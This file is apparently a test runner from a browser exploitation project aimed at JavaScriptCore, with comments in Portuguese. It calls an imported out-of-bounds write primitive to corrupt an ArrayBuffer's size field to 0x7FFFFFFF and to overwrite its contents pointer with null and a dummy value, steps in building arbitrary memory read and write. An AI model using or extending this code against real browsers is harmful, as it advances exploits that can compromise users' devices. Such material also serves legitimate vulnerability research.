// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
// Atualize para importar a nova função do arquivo (que pode ter sido renomeado ou refatorado)
import { attempt_aggressive_corruption } from './testCorruptArrayBufferAggressively.mjs'; 
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; 
import { AdvancedInt64, toHex } from '../utils.mjs';

async function runAggressiveABMetadataTests() {
    const FNAME_RUNNER = "runAggressiveABMetadataTests";
    logS3(`==== INICIANDO Testes Agressivos de Corrupção de Metadados de ArrayBuffer (com Uint32Array) ====`, 'test', FNAME_RUNNER);
    
    const size_offset_hex = JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START;
    const contents_ptr_offset_hex = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET;

    // Validar e parsear os offsets
    const size_offset = parseInt(size_offset_hex, 16);
    const contents_ptr_offset = parseInt(contents_ptr_offset_hex, 16);

    if (isNaN(size_offset) || isNaN(contents_ptr_offset)) {
        logS3("ERRO: Offsets de ArrayBuffer em config.mjs não são números hexadecimais válidos!", "error", FNAME_RUNNER);
        return;
    }

    // Teste 1: Corromper o TAMANHO do oob_array_buffer_real
    logS3(`\n--- Testando Corrupção de Tamanho do ArrayBuffer (Offset: ${toHex(size_offset)}) ---`, 'subtest', FNAME_RUNNER);
    await attempt_aggressive_corruption(
        "AggroCorrupt_AB_Size_to_Large",
        size_offset, 
        0x7FFFFFFF, // Novo tamanho grande
        4,          // Tamanhos são geralmente 4 bytes
        true        // is_size_corruption = true
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    // Teste 2: Corromper o PONTEIRO DE CONTEÚDO para Nulo
    logS3(`\n--- Testando Corrupção de Ponteiro de Conteúdo do AB (Anular) (Offset: ${toHex(contents_ptr_offset)}) ---`, 'subtest', FNAME_RUNNER);
    await attempt_aggressive_corruption(
        "AggroCorrupt_AB_ContentsPtr_to_Null",
        contents_ptr_offset, 
        new AdvancedInt64(0,0),   // Valor NULO para um ponteiro de 64 bits
        8,                        // Ponteiros são 8 bytes
        false                     // is_size_corruption = false
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    
    // Teste 3: Corromper o PONTEIRO DE CONTEÚDO para Dummy
    logS3(`\n--- Testando Corrupção de Ponteiro de Conteúdo do AB (Dummy) (Offset: ${toHex(contents_ptr_offset)}) ---`, 'subtest', FNAME_RUNNER);
    await attempt_aggressive_corruption(
        "AggroCorrupt_AB_ContentsPtr_to_Dummy",
        contents_ptr_offset, 
        new AdvancedInt64("0x4141414142424242"), 
        8,                        
        false                     // is_size_corruption = false
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Testes Agressivos de Corrupção de Metadados de AB (com Uint32Array) CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_AggroCorruptAB';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Testes Agressivos de Corrupção de Metadados AB (Uint32Array) ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Corrupção Agressiva AB (U32A)";
    
    await runAggressiveABMetadataTests();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Testes Agressivos de Corrupção de Metadados AB (Uint32Array)) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
    
    if (document.title.startsWith("Iniciando") || document.title.includes("ERRO") || document.title.includes("CONGELOU?")) {
        // Manter
    } else {
        document.title = "Script 3 Concluído - Corrupção Agressiva AB (U32A)";
    }
}
